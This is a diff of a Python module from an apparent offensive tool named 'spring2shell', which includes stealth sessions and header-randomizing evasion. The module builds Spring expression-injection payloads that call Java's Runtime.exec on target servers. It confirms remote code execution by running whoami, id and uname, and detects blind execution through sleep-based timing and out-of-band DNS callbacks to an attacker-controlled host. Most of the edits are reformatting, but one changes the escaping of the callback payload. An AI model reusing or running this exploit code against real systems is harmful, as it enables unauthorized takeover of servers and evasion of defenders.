@@ -9,23 +9,21 @@ Provides:
 
 from __future__ import annotations
 
-import hashlib
 import logging
+import random
 import re
 import time
-import random
 
 import requests
 
 from spring2shell.core.session import create_stealth_session
 from spring2shell.evasion.headers import get_random_headers
 from spring2shell.utils.logging import log_event, log_swallowed_exception
-from spring2shell.utils.network import ssl_verify
-
 
 # ---------------------------------------------------------------------------
 # Helpers
 # ---------------------------------------------------------------------------
+
 
 def _escape_java_string(value: str) -> str:
     return value.replace("\\", "\\\\").replace('"', '\\"')
@@ -39,7 +37,7 @@ def _build_payload_from_template(payload_template: str | None, command: str) -> 
     try:
         if "COMMAND" in payload_template:
             return payload_template.replace("COMMAND", escaped)
-        pattern = r'exec\\\(\\\"([^\\\"]*)\\\"\\\)'
+        pattern = r"exec\\\(\\\"([^\\\"]*)\\\"\\\)"
         match = re.search(pattern, payload_template)
         if match:
             old_cmd = match.group(1)
@@ -59,9 +57,12 @@ def _send_payload_request(
 ) -> requests.Response:
     if method.upper() == "GET":
         import urllib.parse
+
         return session.get(
-            endpoint, params={"query": urllib.parse.quote(payload)},
-            headers=headers, timeout=timeout,
+            endpoint,
+            params={"query": urllib.parse.quote(payload)},
+            headers=headers,
+            timeout=timeout,
         )
     if "Content-Type" not in headers:
         headers["Content-Type"] = "application/json"
@@ -71,6 +72,7 @@ def _send_payload_request(
 # ---------------------------------------------------------------------------
 # Strict verification (internal — used by exploit_vulnerability)
 # ---------------------------------------------------------------------------
+
 
 def _strict_verify_execution(
     session: requests.Session,
@@ -113,7 +115,9 @@ def _strict_verify_execution(
         payload = _build_payload_from_template(payload_template, attempt_command)
         if not payload:
             escaped = _escape_java_string(attempt_command)
-            payload = f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{escaped}\\")}}}}"  }}'
+            payload = (
+                f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{escaped}\\")}}}}"  }}'
+            )
         try:
             resp = _send_payload_request(
                 session, endpoint, method, headers.copy(), payload, timeout
@@ -129,6 +133,7 @@ def _strict_verify_execution(
 # ---------------------------------------------------------------------------
 # Public verification API
 # ---------------------------------------------------------------------------
+
 
 def check_real_rce(
     target_url: str,
@@ -160,7 +165,6 @@ def check_real_rce(
 
     try:
         if method.upper() == "GET":
-            import urllib.parse
             response = session.get(endpoint, params={"query": payload}, headers=headers)
         else:
             headers["Content-Type"] = "application/json"
@@ -178,21 +182,22 @@ def check_real_rce(
     log_event(logging.INFO, "Test 2: known-output indicators")
     test_commands: list[tuple[str, list[str]]] = [
         ("whoami", ["root", "admin", "user", "apache", "nginx", "www-data"]),
-        ("id",     ["uid=", "gid=", "groups="]),
-        ("pwd",    ["/", "home/", "var/", "usr/"]),
+        ("id", ["uid=", "gid=", "groups="]),
+        ("pwd", ["/", "home/", "var/", "usr/"]),
         ("uname -a", ["Linux", "Darwin", "Windows", "kernel"]),
     ]
     for test_cmd, indicators in test_commands:
         p = f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{test_cmd}\\")}}}}"}}'
         try:
             if method.upper() == "GET":
-                import urllib.parse
                 r = session.get(endpoint, params={"query": p}, headers=headers, timeout=5)
             else:
                 r = session.post(endpoint, data=p, headers=headers, timeout=5)
             for indicator in indicators:
                 if indicator.lower() in r.text.lower():
-                    log_event(logging.INFO, f"Known-output indicator '{indicator}' found for '{test_cmd}'")
+                    log_event(
+                        logging.INFO, f"Known-output indicator '{indicator}' found for '{test_cmd}'"
+                    )
         except Exception:
             continue
         time.sleep(0.5)
@@ -231,7 +236,6 @@ def blind_rce_test(
     try:
         t0 = time.time()
         if method.upper() == "GET":
-            import urllib.parse
             session.get(endpoint, params={"query": baseline_payload}, headers=headers, timeout=5)
         else:
             headers["Content-Type"] = "application/json"
@@ -247,38 +251,42 @@ def blind_rce_test(
         try:
             t0 = time.time()
             if method.upper() == "GET":
-                import urllib.parse
                 session.get(endpoint, params={"query": payload}, headers=headers, timeout=10)
             else:
                 session.post(endpoint, data=payload, headers=headers, timeout=10)
             elapsed = time.time() - t0
             if elapsed > baseline_time + 2.0:
-                log_event(logging.WARNING,
-                          f"POSSIBLE BLIND RCE (time-delay): {elapsed:.2f}s vs baseline {baseline_time:.2f}s")
+                log_event(
+                    logging.WARNING,
+                    f"POSSIBLE BLIND RCE (time-delay): {elapsed:.2f}s vs baseline {baseline_time:.2f}s",
+                )
                 return True
         except requests.exceptions.Timeout:
-            log_event(logging.WARNING, "POSSIBLE BLIND RCE: request timed out (sleep may have executed)")
+            log_event(
+                logging.WARNING, "POSSIBLE BLIND RCE: request timed out (sleep may have executed)"
+            )
             return True
         except Exception as exc:
             log_swallowed_exception(f"blind_rce sleep_cmd={sleep_cmd}", exc)
 
     # ── Test 2: DNS callback (OOB) ───────────────────────────────────────────
     log_event(logging.INFO, "Blind RCE Test 2: DNS callback (OOB)")
-    from spring2shell.utils.oob import generate_oob_host, poll_oob, build_oob_payloads
+    from spring2shell.utils.oob import build_oob_payloads, generate_oob_host, poll_oob
 
     oob_host = generate_oob_host()
     oob_cmds = build_oob_payloads(oob_host)
 
     for oob_cmd in oob_cmds:
         escaped = _escape_java_string(oob_cmd)
-        payload = f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\"{escaped}\")}}}}"}}'
+        payload = f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec("{escaped}")}}}}"}}'
         try:
             if method.upper() == "GET":
-                import urllib.parse
                 session.get(endpoint, params={"query": payload}, headers=headers, timeout=5)
             else:
                 session.post(endpoint, data=payload, headers=headers, timeout=5)
-            log_event(logging.INFO, f"OOB callback request sent for cmd '{oob_cmd}' to host {oob_host}")
+            log_event(
+                logging.INFO, f"OOB callback request sent for cmd '{oob_cmd}' to host {oob_host}"
+            )
             time.sleep(1)
         except Exception as exc:
             log_swallowed_exception(f"blind_rce OOB {oob_host} (cmd: {oob_cmd})", exc)
